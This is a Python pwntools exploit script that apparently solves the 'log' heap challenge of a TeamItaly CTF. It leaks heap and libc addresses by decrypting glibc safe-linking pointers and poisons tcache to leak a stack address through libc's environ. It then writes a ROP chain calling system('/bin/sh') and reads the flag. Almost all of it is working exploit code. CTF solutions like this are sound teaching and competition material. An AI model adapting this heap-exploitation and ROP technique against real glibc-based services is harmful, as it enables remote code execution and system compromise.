#!/usr/bin/env python3

from pwn import *

exe = ELF(os.path.join(os.path.dirname(__file__), "log_patched"))
libc = ELF(os.path.join(os.path.dirname(__file__), "libc.so.6"))
context.binary = exe
#context.terminal = ["tmux", "neww", "-n", "shell"]

#host, port = "127.0.0.1", 9001
host = os.environ.get("HOST", "log.challs.teamitaly.eu")
port = int(os.environ.get("PORT", 29006))
user = "hacker"

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.LOCAL:
        return process([exe.path] + argv, *a, **kw)
    elif args.SSH:
        return ssh(user, host)
    else:
        return remote(host, port)

gdbscript = '''
dprint *((void *)(&add_request)+0xa4),"malloc(%d): ",$rdi
dprint *((void *)(&add_request)+0xa9),"%p\\n",$rax
dprint *((void *)(&remove_request)+0x7b),"free(%p)\\n",$rdi
continue
'''.format(**locals())

ru  = lambda *x, **y: io.recvuntil(*x, **y)
rl  = lambda *x, **y: io.recvline(*x, **y)
rc  = lambda *x, **y: io.recv(*x, **y)
sla = lambda *x, **y: io.sendlineafter(*x, **y)
sa  = lambda *x, **y: io.sendafter(*x, **y)
sl  = lambda *x, **y: io.sendline(*x, **y)
sn  = lambda *x, **y: io.send(*x, **y)


def add_request(sz, data):
    message = p32(0) + p32(sz) + data
    sa(b"> ", message)

def show(idx):
    message = p32(1) + p32(idx)
    sa(b"> ", message)
    rc(4)
    sz = u32(rc(4))
    return rc(sz)

def remove(idx):
    message = p32(2) + p32(idx)
    sa(b"> ", message)

def save_log():
    message = p32(3)
    sa(b"> ", message)

def q():
    message = p32(5)
    sa(b"> ", message)
"""
long decrypt(long cipher)
{
	puts("The decryption uses the fact that the first 12bit of the plaintext (the fwd pointer) is known,");
	puts("because of the 12bit sliding.");
	puts("And the key, the ASLR value, is the same with the leading bits of the plaintext (the fwd pointer)");
	long key = 0;
	long plain;

	for(int i=1; i<6; i++) {
		int bits = 64-12*i;
		if(bits < 0) bits = 0;
		plain = ((cipher ^ key) >> bits) << bits;
		key = plain >> 12;
		printf("round %d:\n", i);
		printf("key:    %#016lx\n", key);
		printf("plain:  %#016lx\n", plain);
		printf("cipher: %#016lx\n\n", cipher);
	}
	return plain;
}
"""
def decrypt(cipher):
    key =0

    for i in range(1, 7):
        bits = 64-12*i
        if(bits<0):
            bits=0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain

# -- Exploit goes here --
io = start()

add_request(0x80, b"a"*0x80)
add_request(0x80, b"a"*0x80)
remove(0)
remove(0)
heap = decrypt(u64(show(0)[:8])) - 0x2a0
#print(hex(heap))
for i in range(12):
    add_request(0x100, b"a"*0x100)


for i in range(7):
    remove(5)

remove(13)
lib = u64(show(13)[:8])-0x219ce0
libc.address = lib
#print(hex(lib))

remove(5)
add_request(0x100, b"a"*0x100)
remove(13)

k = (heap + 0x11b0)>>12
chunks = heap + 0x1560-0x90
big_chunk = heap + 0x10f0
victim_chunk = heap + 0x11b0
payload = cyclic(0xb0) + p64(0) + p64(0x111)
payload += p64((chunks)^k)# fwd
payload += b"A"*(0x1c0-len(payload))
add_request(0x1c0, payload)
#print(hex(big_chunk))

add_request(0x100, b"a"*0x100)

payload = b"\x00"*0x88
payload += p64(0xa1) # top_size
payload += p64(libc.sym["environ"])
payload += p64(big_chunk)
payload += p64(big_chunk)
payload += p64(victim_chunk)
payload += b"A"*(0x100-len(payload))
add_request(0x200, b"a"*0x200)
add_request(0x100, payload)
add_request(0x200, b"a"*0x200)
add_request(0x200, b"a"*0x200)

stack = u64(show(0)[:8])
#print(hex(stack))

remove(3)
remove(2)

rbp = stack-0x148
payload = cyclic(0xb0) + p64(0) + p64(0x111)
payload += p64((rbp)^k)# fwd
payload += b"A"*(0x1c0-len(payload))
add_request(0x1c0, payload)
add_request(0x100, b"a"*0x100)
rop = ROP(libc)
chain = p64(rop.ret.address) + p64(rop.rdi.address) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.sym["system"])
chain += b"a"*(0x100-8-len(chain))
add_request(0x100, b"a"*8+chain)

sl(b"cat flag")
rc()
print(rc().decode())
io.close()

